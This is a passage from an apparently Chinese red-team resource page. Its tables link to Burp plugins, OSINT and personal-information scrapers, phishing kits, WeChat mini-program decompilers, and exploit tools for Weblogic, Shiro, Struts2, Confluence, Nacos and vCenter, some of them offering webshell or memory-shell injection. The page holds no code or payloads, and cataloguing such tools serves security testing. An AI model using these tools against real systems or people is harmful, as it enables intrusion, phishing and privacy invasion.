<td>一个简单的Fastjson反序列化检测burp插件</td>
<td><a href="https://github.com/Maskhe/FastjsonScan">https://github.com/Maskhe/FastjsonScan</a></td>
<td>FastjsonScan</td>
</tr>
<tr>
<td>fastjson利用，支持tomcat、spring回显，哥斯拉内存马；回显利用链为dhcp、ibatis、c3p0</td>
<td><a href="https://github.com/skisw/fastjson-exp">https://github.com/skisw/fastjson-exp</a></td>
<td>fastjson-exp</td>
</tr>
<tr>
<td>添加一些右键菜单让burp用起来更顺畅</td>
<td><a href="https://github.com/bit4woo/knife">https://github.com/bit4woo/knife</a></td>
<td>knife</td>
</tr>
<tr>
<td>domain_hunter_pro 一个资产管理类的Burp插件</td>
<td><a href="https://github.com/bit4woo/domain_hunter_pro">https://github.com/bit4woo/domain_hunter_pro</a></td>
<td>domain_hunter_pro</td>
</tr>
<tr>
<td>新一代子域名主&#x2F;被动收集工具</td>
<td><a href="https://github.com/Acmesec/Sylas">https://github.com/Acmesec/Sylas</a></td>
<td>Sylas</td>
</tr>
<tr>
<td>GadgetProbe Burp插件 用来爆破远程类查找Java反序列化</td>
<td><a href="https://github.com/BishopFox/GadgetProbe">https://github.com/BishopFox/GadgetProbe</a></td>
<td>GadgetProbe</td>
</tr>
<tr>
<td>HopLa 自动补全 Payload 的 BurpSuite插件</td>
<td><a href="https://github.com/synacktiv/HopLa">https://github.com/synacktiv/HopLa</a></td>
<td>HopLa</td>
</tr>
<tr>
<td>验证码识别</td>
<td><a href="https://github.com/f0ng/captcha-killer-modified">https://github.com/f0ng/captcha-killer-modified</a></td>
<td>captcha-killer-modified</td>
</tr>
<tr>
<td>伪造ip地址</td>
<td><a href="https://github.com/TheKingOfDuck/burpFakeIP">https://github.com/TheKingOfDuck/burpFakeIP</a></td>
<td>burpFakeIP</td>
</tr>
<tr>
<td>自动发送请求</td>
<td><a href="https://github.com/nccgroup/AutoRepeater">https://github.com/nccgroup/AutoRepeater</a></td>
<td>AutoRepeater</td>
</tr>
<tr>
<td>自动探测请求走私漏洞</td>
<td><a href="https://github.com/portswigger/http-request-smuggler">https://github.com/portswigger/http-request-smuggler</a></td>
<td>http-request-smuggler</td>
</tr>
<tr>
<td>用于在所有请求中自动执行 SSRF 检测</td>
<td><a href="https://github.com/ethicalhackingplayground/ssrf-king">https://github.com/ethicalhackingplayground/ssrf-king</a></td>
<td>ssrf-king</td>
</tr>
<tr>
<td>主要用于简化和解决Burpsuite对Http的一些操作.</td>
<td><a href="https://github.com/MaskCyberSecurityTeam/BurpHttpHelper">https://github.com/MaskCyberSecurityTeam/BurpHttpHelper</a></td>
<td>BurpHttpHelper</td>
</tr>
<tr>
<td>用于Outlook用户信息收集，在已登录Outlook账号后，可以使用该插件自动爬取所有联系人的信息</td>
<td><a href="https://github.com/KrystianLi/OutLook">https://github.com/KrystianLi/OutLook</a></td>
<td>OutLook</td>
</tr>
<tr>
<td>提取参数插件</td>
<td><a href="https://github.com/goddemondemongod/god_param">https://github.com/goddemondemongod/god_param</a></td>
<td>god_param</td>
</tr>
<tr>
<td>这是一款burp插件，用于Outlook 网页版用户信息收集，在已登录Outlook 网页版账号后，可以使用该</td>
<td><a href="https://github.com/KrystianLi/ExchangeOWA">https://github.com/KrystianLi/ExchangeOWA</a></td>
<td>ExchangeOWA</td>
</tr>
<tr>
<td>对权限绕过自动化bypass的burpsuite插件</td>
<td><a href="https://github.com/0x727/BypassPro">https://github.com/0x727/BypassPro</a></td>
<td>BypassPro</td>
</tr>
<tr>
<td>Tls指纹特征绕过插件|Bypass</td>
<td><a href="https://github.com/sleeyax/burp-awesome-tls">https://github.com/sleeyax/burp-awesome-tls</a></td>
<td>burp-awesome-tls</td>
</tr>
<tr>
<td>BurpSuite插件实现被动指纹识别+网站提取链接+OA爆破，可帮助我们发现更多资产。</td>
<td><a href="https://github.com/shuanx/BurpFingerPrint">https://github.com/shuanx/BurpFingerPrint</a></td>
<td>BurpFingerPrint</td>
</tr>
<tr>
<td>攻防演练过程中，我们通常会用浏览器访问一些资产，但很多未授权&#x2F;敏感信息&#x2F;越权隐匿在已访问接口过html、JS文件等，该插件能让我们发现未授权&#x2F;敏感信息&#x2F;越权&#x2F;登陆接口等。</td>
<td><a href="https://github.com/shuanx/BurpAPIFinder">https://github.com/shuanx/BurpAPIFinder</a></td>
<td>BurpAPIFinder</td>
</tr>
</tbody></table>
<h2 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>Hack-Tools  适用于红队的浏览器扩展插件</td>
<td><a href="https://github.com/LasCC/Hack-Tools">https://github.com/LasCC/Hack-Tools</a></td>
<td>Hack-Tools</td>
</tr>
<tr>
<td>基于chrome、firefox插件的被动式信息泄漏检测工具</td>
<td><a href="https://github.com/momosecurity/FindSomething">https://github.com/momosecurity/FindSomething</a></td>
<td>FindSomething</td>
</tr>
<tr>
<td>superSearchPlus是聚合型信息收集插件，支持综合查询，资产测绘查询，信息收集 敏感信息提取 js资源扫描 目录扫描 vue组件扫描 整合了目前常见的资产测绘平台 同时支持数据导出</td>
<td><a href="https://github.com/dark-kingA/superSearchPlus">https://github.com/dark-kingA/superSearchPlus</a></td>
<td>superSearchPlus</td>
</tr>
<tr>
<td>SwitchyOmega 浏览器的代理插件</td>
<td><a href="https://github.com/FelisCatus/SwitchyOmega">https://github.com/FelisCatus/SwitchyOmega</a></td>
<td>SwitchyOmega</td>
</tr>
<tr>
<td>Chrome插件.使用DevTools查找DOM XSS</td>
<td><a href="https://github.com/filedescriptor/untrusted-types">https://github.com/filedescriptor/untrusted-types</a></td>
<td>untrusted-types</td>
</tr>
<tr>
<td>FOFA Pro view 是一款FOFA Pro 资产展示浏览器插件</td>
<td><a href="https://github.com/fofapro/fofa_view">https://github.com/fofapro/fofa_view</a></td>
<td>fofa_view</td>
</tr>
<tr>
<td>mitaka 用于 OSINT 搜索的Chrome和Firefox扩展</td>
<td><a href="https://github.com/ninoseki/mitaka">https://github.com/ninoseki/mitaka</a></td>
<td>mitaka</td>
</tr>
<tr>
<td>Git History 查看git存储库文件的历史记录</td>
<td><a href="https://githistory.xyz/">https://githistory.xyz/</a></td>
<td>Git History</td>
</tr>
<tr>
<td>一款可以检测WEB蜜罐并阻断请求的Chrome插件</td>
<td><a href="https://github.com/cnrstar/anti-honeypot">https://github.com/cnrstar/anti-honeypot</a></td>
<td>anti-honeypot</td>
</tr>
<tr>
<td>一款完全被动监听的谷歌插件，用于高危指纹识别、蜜罐特征告警和拦截、机器特征对抗。</td>
<td><a href="https://github.com/graynjo/Heimdallr">https://github.com/graynjo/Heimdallr</a></td>
<td>Heimdallr</td>
</tr>
<tr>
<td>SourceDetector是一个自动发现.map文件，并帮你下载到本地的一个chrome extension。</td>
<td><a href="https://github.com/Lz1y/SourceDetector-dist">https://github.com/Lz1y/SourceDetector-dist</a></td>
<td>SourceDetector-dist</td>
</tr>
</tbody></table>
<h2 id="邮箱-钓鱼"><a href="#邮箱-钓鱼" class="headerlink" title="邮箱&amp;钓鱼"></a>邮箱&amp;钓鱼</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>邮箱自动化收集爬取</td>
<td><a href="https://github.com/Taonn/EmailAll">https://github.com/Taonn/EmailAll</a></td>
<td>EmailAll</td>
</tr>
<tr>
<td>通过搜索引擎爬取电子邮件</td>
<td><a href="https://github.com/Josue87/EmailFinder">https://github.com/Josue87/EmailFinder</a></td>
<td>EmailFinder</td>
</tr>
<tr>
<td>批量检查邮箱账密有效的  Python 脚本</td>
<td><a href="https://github.com/rm1984/IMAPLoginTester">https://github.com/rm1984/IMAPLoginTester</a></td>
<td>IMAPLoginTester</td>
</tr>
<tr>
<td>Coremail邮件系统组织通讯录导出脚本</td>
<td><a href="https://github.com/dpu/coremail-address-book">https://github.com/dpu/coremail-address-book</a></td>
<td>coremail-address-book</td>
</tr>
<tr>
<td>拥有在线模板设计、发送诱骗广告等功能的钓鱼系统</td>
<td><a href="https://github.com/gophish/gophish">https://github.com/gophish/gophish</a></td>
<td>gophish</td>
</tr>
<tr>
<td>Swaks SMTP界的瑞士军刀</td>
<td><a href="https://github.com/jetmore/swaks">https://github.com/jetmore/swaks</a></td>
<td>swaks</td>
</tr>
<tr>
<td>一个在线的任意发件人发送Email邮件网站</td>
<td><a href="http://tool.chacuo.net/mailanonymous">http://tool.chacuo.net/mailanonymous</a></td>
<td>mailanonymous</td>
</tr>
<tr>
<td>EwoMail是基于Linux的企业邮箱服务器</td>
<td><a href="https://github.com/gyxuehu/EwoMail">https://github.com/gyxuehu/EwoMail</a></td>
<td>EwoMail</td>
</tr>
<tr>
<td>批量发送钓鱼邮箱</td>
<td><a href="https://github.com/Yang0615777/sendMail">https://github.com/Yang0615777/sendMail</a></td>
<td>sendMail</td>
</tr>
<tr>
<td>免杀宏生成器</td>
<td><a href="https://github.com/Inf0secRabbit/BadAssMacros">https://github.com/Inf0secRabbit/BadAssMacros</a></td>
<td>BadAssMacros</td>
</tr>
<tr>
<td>图标提取</td>
<td><a href="https://github.com/JarlPenguin/BeCyIconGrabberPortable">https://github.com/JarlPenguin/BeCyIconGrabberPortable</a></td>
<td>BeCyIconGrabberPortable</td>
</tr>
<tr>
<td>图标替换</td>
<td><a href="https://github.com/guitarfreak/SetIcon">https://github.com/guitarfreak/SetIcon</a></td>
<td>SetIcon</td>
</tr>
<tr>
<td>红蓝对抗：钓鱼演练资源汇总&amp;备忘录</td>
<td><a href="https://github.com/tib36/PhishingBook">https://github.com/tib36/PhishingBook</a></td>
<td>PhishingBook</td>
</tr>
<tr>
<td>剑指钓鱼基建快速部署自动化</td>
<td><a href="https://github.com/taielab/Taie-AutoPhishing">https://github.com/taielab/Taie-AutoPhishing</a></td>
<td>Taie-AutoPhishing</td>
</tr>
<tr>
<td>一款适用于红蓝对抗中的仿真钓鱼系统</td>
<td><a href="https://github.com/xiecat/goblin">https://github.com/xiecat/goblin</a></td>
<td>goblin</td>
</tr>
</tbody></table>
<h2 id="社工个人信息收集类"><a href="#社工个人信息收集类" class="headerlink" title="社工个人信息收集类"></a>社工个人信息收集类</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>从大量站点中收集用户个人信息</td>
<td><a href="https://github.com/soxoj/maigret">https://github.com/soxoj/maigret</a></td>
<td>maigret</td>
</tr>
<tr>
<td>根据邮箱自动搜索泄漏的密码信息</td>
<td><a href="https://github.com/D4Vinci/Cr3dOv3r">https://github.com/D4Vinci/Cr3dOv3r</a></td>
<td>Cr3dOv3r</td>
</tr>
<tr>
<td>密码泄露搜集</td>
<td><a href="https://archive.org/search.php?query=">https://archive.org/search.php?query=</a></td>
<td>archive</td>
</tr>
<tr>
<td>从部分站点中收集个人信息</td>
<td><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a></td>
<td>Sreg</td>
</tr>
<tr>
<td>输入人名或邮箱地址, 自动从互联网爬取关于此人的信息</td>
<td><a href="https://github.com/famavott/osint-scraper">https://github.com/famavott/osint-scraper</a></td>
<td>osint-scraper</td>
</tr>
<tr>
<td>通过脉脉用户猜测企业邮箱</td>
<td><a href="https://github.com/Ridter/Mailget">https://github.com/Ridter/Mailget</a></td>
<td>Mailget</td>
</tr>
<tr>
<td>社工字典密码生成</td>
<td><a href="https://github.com/Mebus/cupp">https://github.com/Mebus/cupp</a></td>
<td>cupp</td>
</tr>
<tr>
<td>社会工程学密码生成器，是一个利用个人信息生成密码的工具</td>
<td><a href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator">https://github.com/zgjx6/SocialEngineeringDictionaryGenerator</a></td>
<td>DictionaryGenerator</td>
</tr>
<tr>
<td>在线密码生成器</td>
<td><a href="https://zzzteph.github.io/weakpass/">https://zzzteph.github.io/weakpass/</a></td>
<td>weakpass</td>
</tr>
</tbody></table>
<h2 id="APP-公众号-小程序相关工具"><a href="#APP-公众号-小程序相关工具" class="headerlink" title="APP&#x2F;公众号&#x2F;小程序相关工具"></a>APP&#x2F;公众号&#x2F;小程序相关工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>（推荐）微信小程序反编译工具，.wxapkg 文件扫描 + 解密 + 解包工具</td>
<td><a href="https://github.com/wux1an/wxapkg">https://github.com/wux1an/wxapkg</a></td>
<td>wxapkg</td>
</tr>
<tr>
<td>全自动化，微信小程序 wxapkg 包 源代码还原工具, 线上代码安全审计</td>
<td><a href="https://github.com/biggerstar/wedecode">https://github.com/biggerstar/wedecode</a></td>
<td>wedecode</td>
</tr>
<tr>
<td>微信小程序辅助渗透-自动化</td>
<td><a href="https://github.com/eeeeeeeeee-code/e0e1-wx">https://github.com/eeeeeeeeee-code/e0e1-wx</a></td>
<td>e0e1-wx</td>
</tr>
<tr>
<td>自动化反编译微信小程序，小程序安全评估工具，发现小程序安全问题，自动解密，解包，可还原工程目录，支持Hook，小程序修改</td>
<td><a href="https://github.com/Ackites/KillWxapkg">https://github.com/Ackites/KillWxapkg</a></td>
<td>KillWxapkg</td>
</tr>
<tr>
<td>一个反编译微信小程序的工具，仓库也收集各种微信小程序&#x2F;小游戏.wxapkg文件</td>
<td><a href="https://github.com/ezshine/wxapkg-convertor">https://github.com/ezshine/wxapkg-convertor</a></td>
<td>wxapkg-convertor</td>
</tr>
<tr>
<td>微信小程序主包解密工具</td>
<td><a href="https://github.com/BlackTrace/pc_wxapkg_decrypt">https://github.com/BlackTrace/pc_wxapkg_decrypt</a></td>
<td>pc_wxapkg_decrypt</td>
</tr>
<tr>
<td>微信小程序反编译</td>
<td><a href="https://github.com/qwerty472123/wxappUnpacker">https://github.com/qwerty472123/wxappUnpacker</a></td>
<td>wxappUnpacker（自行寻找备份仓库）</td>
</tr>
<tr>
<td>微信小程序反编译</td>
<td><a href="https://github.com/r3x5ur/wxapkg-unpacker">https://github.com/r3x5ur/wxapkg-unpacker</a></td>
<td>wxapkg-unpacker（二开）</td>
</tr>
<tr>
<td>微信小程序信息在线收集，wxapkg源码包内提取信息</td>
<td><a href="https://github.com/moyuwa/wechat_appinfo_wxapkg">https://github.com/moyuwa/wechat_appinfo_wxapkg</a></td>
<td>wechat_appinfo_wxapkg</td>
</tr>
<tr>
<td>WeChatOpenDevTool 微信小程序强制开启开发者工具</td>
<td><a href="https://github.com/x0tools/WeChatOpenDevTools">https://github.com/x0tools/WeChatOpenDevTools</a></td>
<td>WeChatOpenDevTools</td>
</tr>
<tr>
<td>WeChatOpenDevTool 微信小程序强制开启开发者工具py</td>
<td><a href="https://github.com/JaveleyQAQ/WeChatOpenDevTools-Python">https://github.com/JaveleyQAQ/WeChatOpenDevTools-Python</a></td>
<td>WeChatOpenDevTools-Python</td>
</tr>
<tr>
<td>Resources移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具</td>
<td><a href="https://github.com/kelvinBen/AppInfoScanner">https://github.com/kelvinBen/AppInfoScanner</a></td>
<td>AppInfoScanner</td>
</tr>
<tr>
<td>一款适用于以APP病毒分析、APP漏洞挖掘、APP开发、HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS)辅助分析工具</td>
<td><a href="https://github.com/sulab999/AppMessenger">https://github.com/sulab999/AppMessenger</a></td>
<td>AppMessenger</td>
</tr>
<tr>
<td>apk爬虫工具可提取包内url等信息</td>
<td><a href="https://github.com/dwisiswant0/apkleaks">https://github.com/dwisiswant0/apkleaks</a></td>
<td>apkleaks</td>
</tr>
<tr>
<td>安卓应用层抓包通杀脚本</td>
<td><a href="https://github.com/r0ysue/r0capture">https://github.com/r0ysue/r0capture</a></td>
<td>r0capture</td>
</tr>
<tr>
<td>用于存取记录以前的基址和小程序文件</td>
<td><a href="https://github.com/eeeeeeeeee-code/wx-hook">https://github.com/eeeeeeeeee-code/wx-hook</a></td>
<td>wx-hook</td>
</tr>
</tbody></table>
<h2 id="常用小工具"><a href="#常用小工具" class="headerlink" title="常用小工具"></a>常用小工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>好用的去重对比工具</td>
<td><a href="https://github.com/tomnomnom/anew">https://github.com/tomnomnom/anew</a></td>
<td>anew</td>
</tr>
<tr>
<td>视觉侦查工具，用于信息收集屏幕截图</td>
<td><a href="https://github.com/sensepost/gowitness">https://github.com/sensepost/gowitness</a></td>
<td>gowitness</td>
</tr>
<tr>
<td>一款jar包分析小工具</td>
<td><a href="https://github.com/4ra1n/jar-analyzer">https://github.com/4ra1n/jar-analyzer</a></td>
<td>jar-analyzer</td>
</tr>
<tr>
<td>参数FUZZ小工具</td>
<td><a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></td>
<td>Arjun</td>
</tr>
<tr>
<td>一款用于快速导出URL、Domain和IP的小工具</td>
<td><a href="https://github.com/mstxq17/MoreFind">https://github.com/mstxq17/MoreFind</a></td>
<td>MoreFind</td>
</tr>
<tr>
<td>Xtools 是一款 Sublime Text 插件，同时是一款简单的资产处理、命令行调用工具。</td>
<td><a href="https://github.com/chasingboy/Xtools">https://github.com/chasingboy/Xtools</a></td>
<td>Xtools</td>
</tr>
<tr>
<td>对Web渗透项目资产进行快速存活验证</td>
<td><a href="https://github.com/AabyssZG/Web-SurvivalScan">https://github.com/AabyssZG/Web-SurvivalScan</a></td>
<td>Web-SurvivalScan</td>
</tr>
<tr>
<td>二进制文件切割&amp;合并工具</td>
<td><a href="https://github.com/AabyssZG/BinaryCutting-Tool">https://github.com/AabyssZG/BinaryCutting-Tool</a></td>
<td>BinaryCutting-Tool</td>
</tr>
<tr>
<td>命令执行写任意文件，主要用于命令执行但不出网情况</td>
<td><a href="https://github.com/Ar3h/putter">https://github.com/Ar3h/putter</a></td>
<td>putter</td>
</tr>
<tr>
<td>一个 CLASS 文件混淆工具，支持方法名&#x2F;字段名&#x2F;参数名引用分析和重命名混淆方式，支持字符串提取&#x2F;整型异或混淆&#x2F;垃圾代码花指令混淆&#x2F;等方式，支持方法和字段的隐藏，配置简单，容易上手</td>
<td><a href="https://github.com/jar-analyzer/class-obf">https://github.com/jar-analyzer/class-obf</a></td>
<td>class-obf</td>
</tr>
</tbody></table>
<h1 id="漏洞利用工具"><a href="#漏洞利用工具" class="headerlink" title="漏洞利用工具"></a>漏洞利用工具</h1><h2 id="漏洞扫描框架-工具"><a href="#漏洞扫描框架-工具" class="headerlink" title="漏洞扫描框架&#x2F;工具"></a>漏洞扫描框架&#x2F;工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>高危漏洞精准检测与深度利用框架</td>
<td><a href="https://github.com/woodpecker-framework/woodpecker-framwork-release">https://github.com/woodpecker-framework/woodpecker-framwork-release</a></td>
<td>woodpecker-framwork</td>
</tr>
<tr>
<td>基于简单 YAML 的 DSL 的快速且可定制的漏洞扫描器。</td>
<td><a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></td>
<td>nuclei</td>
</tr>
<tr>
<td>afrog 是一款性能卓越、快速稳定、PoC 可定制化的漏洞扫描工具</td>
<td><a href="https://github.com/zan8in/afrog">https://github.com/zan8in/afrog</a></td>
<td>afrog</td>
</tr>
<tr>
<td>EZ是一款集信息收集、端口扫描、服务暴破、URL爬虫、指纹识别、被动扫描为一体的跨平台漏洞扫描器。</td>
<td><a href="https://github.com/m-sec-org/EZ">https://github.com/m-sec-org/EZ</a></td>
<td>EZ</td>
</tr>
<tr>
<td>一款功能强大的安全评估工具</td>
<td><a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></td>
<td>Xray</td>
</tr>
<tr>
<td>网络安全测试工具</td>
<td><a href="https://github.com/gobysec/Goby">https://github.com/gobysec/Goby</a></td>
<td>Goby</td>
</tr>
<tr>
<td>开源的远程漏洞测试框架</td>
<td><a href="https://github.com/knownsec/pocsuite3">https://github.com/knownsec/pocsuite3</a></td>
<td>pocsuite3</td>
</tr>
<tr>
<td>全新的开源在线 poc 测试框架</td>
<td><a href="https://github.com/jweny/pocassist">https://github.com/jweny/pocassist</a></td>
<td>pocassist</td>
</tr>
<tr>
<td>一个应用于web安全领域的漏洞批量扫描框架</td>
<td><a href="https://github.com/bigblackhat/oFx">https://github.com/bigblackhat/oFx</a></td>
<td>oFx</td>
</tr>
<tr>
<td>是一款 web 漏洞扫描和验证工具</td>
<td><a href="https://github.com/zhzyker/vulmap">https://github.com/zhzyker/vulmap</a></td>
<td>Vulmap</td>
</tr>
<tr>
<td>一款全面而强大的漏洞扫描和利用工具</td>
<td><a href="https://github.com/yhy0/Jie">https://github.com/yhy0/Jie</a></td>
<td>Jie</td>
</tr>
<tr>
<td>自动整合全网Nuclei的漏洞POC，实时同步更新最新POC！</td>
<td><a href="https://github.com/ExpLangcn/NucleiTP">https://github.com/ExpLangcn/NucleiTP</a></td>
<td>NucleiTP</td>
</tr>
</tbody></table>
<h2 id="中间件-应用漏洞利用工具"><a href="#中间件-应用漏洞利用工具" class="headerlink" title="中间件&#x2F;应用漏洞利用工具"></a>中间件&#x2F;应用漏洞利用工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>Spring漏洞综合利用工具</td>
<td><a href="https://github.com/savior-only/Spring_All_Reachable">https://github.com/savior-only/Spring_All_Reachable</a></td>
<td>Spring_All_Reachable</td>
</tr>
<tr>
<td>针对SpringBoot的开源渗透框架，以及Spring相关高危漏洞利用工具</td>
<td><a href="https://github.com/AabyssZG/SpringBoot-Scan">https://github.com/AabyssZG/SpringBoot-Scan</a></td>
<td>SpringBoot-Scan</td>
</tr>
<tr>
<td>一款java漏洞集合工具</td>
<td><a href="https://github.com/pureqh/Hyacinth">https://github.com/pureqh/Hyacinth</a></td>
<td>Hyacinth</td>
</tr>
<tr>
<td>WeblogicTool，GUI漏洞利用工具，支持漏洞检测、命令执行、内存马注入、密码解密等（深信服深蓝实验室天威战队强力驱动）</td>
<td><a href="https://github.com/KimJun1010/WeblogicTool">https://github.com/KimJun1010/WeblogicTool</a></td>
<td>WeblogicTool</td>
</tr>
<tr>
<td>shiro 反序列 命令执行辅助检测工具</td>
<td><a href="https://github.com/wyzxxz/shiro_rce_tool">https://github.com/wyzxxz/shiro_rce_tool</a></td>
<td>shiro_rce_tool</td>
</tr>
<tr>
<td>shiro反序列化漏洞综合利用,包含（回显执行命令&#x2F;注入内存马）修复原版中NoCC的问题</td>
<td><a href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></td>
<td>ShiroAttack2</td>
</tr>
<tr>
<td>shiro反序列化漏洞综合利用,包含（回显执行命令&#x2F;注入内存马）</td>
<td><a href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></td>
<td>shiro_attack</td>
</tr>
<tr>
<td>复杂请求下的Shiro反序列化利用工具</td>
<td><a href="https://github.com/sma11new/Pyke-Shiro">https://github.com/sma11new/Pyke-Shiro</a></td>
<td>Pyke-Shiro</td>
</tr>
<tr>
<td>Fastjson扫描器，可识别版本、依赖库、autoType状态等。</td>
<td><a href="https://github.com/a1phaboy/FastjsonScan">https://github.com/a1phaboy/FastjsonScan</a></td>
<td>FastjsonScan</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Jboss（和 Java 反序列化漏洞）验证和利用工具</td>
<td><a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></td>
<td>jexBoss</td>
</tr>
<tr>
<td>Dubbo反序列化一键快速攻击测试工具</td>
<td><a href="https://github.com/threedr3am/dubbo-exp">https://github.com/threedr3am/dubbo-exp</a></td>
<td>dubbo-exp</td>
</tr>
<tr>
<td>jenkins-attack-framework 针对 Jenkins 的攻击框架</td>
<td><a href="https://github.com/Accenture">https://github.com/Accenture</a></td>
<td>jenkins-attack-framework</td>
</tr>
<tr>
<td>一款Jenkins的综合漏洞利用工具</td>
<td><a href="https://github.com/TheBeastofwar/JenkinsExploit-GUI">https://github.com/TheBeastofwar/JenkinsExploit-GUI</a></td>
<td>JenkinsExploit-GUI</td>
</tr>
<tr>
<td>log4j漏洞利用工具</td>
<td><a href="https://github.com/kozmer/log4j-shell-poc">https://github.com/kozmer/log4j-shell-poc</a></td>
<td>log4j-shell-poc</td>
</tr>
<tr>
<td>一款针对Vcenter的综合利用工具，包含目前最主流的CVE-2021-21972、CVE-2021-21985以及CVE-2021-22005以及log4j，提供一键上传webshell，命令执行或者上传公钥使用SSH免密连接</td>
<td><a href="https://github.com/Schira4396/VcenterKiller">https://github.com/Schira4396/VcenterKiller</a></td>
<td>VcenterKiller</td>
</tr>
<tr>
<td>Vcenter综合渗透利用工具包-GUI</td>
<td><a href="https://github.com/W01fh4cker/VcenterKit">https://github.com/W01fh4cker/VcenterKit</a></td>
<td>VcenterKit</td>
</tr>
<tr>
<td>WeblogicTool，GUI漏洞利用工具，支持漏洞检测、命令执行、内存马注入、密码解密等（深信服深蓝实验室天威战队强力驱动）</td>
<td><a href="https://github.com/KimJun1010/WeblogicTool">https://github.com/KimJun1010/WeblogicTool</a></td>
<td>WeblogicTool</td>
</tr>
<tr>
<td>Weblogic漏洞利用图形化工具 支持注入内存马、一键上传webshell、命令执行</td>
<td><a href="https://github.com/sp4zcmd/WeblogicExploit-GUI">https://github.com/sp4zcmd/WeblogicExploit-GUI</a></td>
<td>WeblogicExploit-GUI</td>
</tr>
<tr>
<td>Weblogic一键漏洞检测工具，V1.5，更新时间：20200730</td>
<td><a href="https://github.com/rabbitmask/WeblogicScan">https://github.com/rabbitmask/WeblogicScan</a></td>
<td>WeblogicScan</td>
</tr>
<tr>
<td>weblogic 漏洞扫描工具。包含2020</td>
<td><a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></td>
<td>weblogicScanner</td>
</tr>
<tr>
<td>woodpecker框架weblogic信息探测插件</td>
<td><a href="https://github.com/woodpecker-appstore/weblogic-infodetector">https://github.com/woodpecker-appstore/weblogic-infodetector</a></td>
<td>weblogic-infodetector</td>
</tr>
<tr>
<td>STS2G Struts2漏洞扫描利用工具 - Golang版</td>
<td><a href="https://github.com/xwuyi/STS2G">https://github.com/xwuyi/STS2G</a></td>
<td>STS2G</td>
</tr>
<tr>
<td>Struts2-Scan Struts2全漏洞扫描利用工具</td>
<td><a href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a></td>
<td>Struts2-Scan</td>
</tr>
<tr>
<td>Struts2全版本漏洞检测工具 by:ABC_123</td>
<td><a href="https://github.com/abc123info/Struts2VulsScanTools">https://github.com/abc123info/Struts2VulsScanTools</a></td>
<td>Struts2VulsScanTools</td>
</tr>
<tr>
<td>Confluence-OGNL一键注入内存shell</td>
<td><a href="https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL">https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL</a></td>
<td>Confluence</td>
</tr>
<tr>
<td>Confluence CVE 2021，2022，2023 利用工具，支持命令执行，哥斯拉，冰蝎 内存马注入</td>
<td><a href="https://github.com/Lotus6/ConfluenceMemshell">https://github.com/Lotus6/ConfluenceMemshell</a></td>
<td>ConfluenceMemshell</td>
</tr>
<tr>
<td>ResourcesYApi接口管理平台远程命令执行</td>
<td><a href="https://github.com/Tas9er/YApiRCE">https://github.com/Tas9er/YApiRCE</a></td>
<td>YApiRCE</td>
</tr>
<tr>
<td>Nacos JRaft Hessian 反序列化 RCE 加载字节码 注入内存马 不出网利用</td>
<td><a href="https://github.com/c0olw/NacosRce">https://github.com/c0olw/NacosRce</a></td>
<td>NacosRce</td>
</tr>
<tr>
<td>Nacos漏洞综合利用GUI工具，集成了默认口令漏洞、SQL注入漏洞、身份认证绕过漏洞、反序列化漏洞的检测及其利用</td>
<td><a href="https://github.com/charonlight/NacosExploitGUI">https://github.com/charonlight/NacosExploitGUI</a></td>
<td>NacosExploitGUI</td>
</tr>
</tbody></table>
<h2 id="重点cms利用工具"><a href="#重点cms利用工具" class="headerlink" title="重点cms利用工具"></a>重点cms利用工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>高危漏洞利用工具</td>
<td><a href="https://github.com/White-hua/Apt_t00ls">https://github.com/White-hua/Apt_t00ls</a></td>
<td>Apt_t00ls</td>
</tr>
<tr>
<td>OA漏洞利用工具，基于Apt-T00ls二次开发工具</td>
<td><a href="https://github.com/R4gd0ll/I-Wanna-Get-All">https://github.com/R4gd0ll/I-Wanna-Get-All</a></td>
<td>I-Wanna-Get-All</td>
</tr>
<tr>
<td>OA综合利用工具，集合将近20款OA漏洞批量扫描</td>
<td><a href="https://github.com/LittleBear4/OA-EXPTOOL">https://github.com/LittleBear4/OA-EXPTOOL</a></td>
<td>OA-EXPTOOL</td>
</tr>
<tr>
<td>OAExploit一款基于产品的一键扫描工具。</td>
<td><a href="https://github.com/achuna33/MYExploit">https://github.com/achuna33/MYExploit</a></td>
<td>MYExploit</td>
</tr>
<tr>
<td>支持自定义Poc文件的图形化漏洞利用工具</td>
<td><a href="https://github.com/bcvgh/daydayEXP">https://github.com/bcvgh/daydayEXP</a></td>
<td>daydayEXP</td>
</tr>
<tr>
